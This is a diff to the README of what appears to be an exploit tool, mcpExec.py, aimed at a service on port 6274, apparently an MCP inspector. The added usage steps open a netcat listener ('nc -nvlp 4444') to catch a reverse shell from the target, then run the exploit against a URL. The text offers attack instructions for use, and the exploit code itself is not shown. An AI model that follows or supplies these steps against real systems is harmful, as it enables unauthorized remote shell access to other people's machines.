@@ -26,6 +26,14 @@ deactivate
 
 ## Usage/Examples
 
+Open a listener for the exploit to work:
+
+```bash
+nc -nvlp 4444
+```
+
+This command will handle you the reverse shell (if the affected system has Python3 installed).
+
 ```bash
 ./mcpExec.py http://localhost:6274
 ```
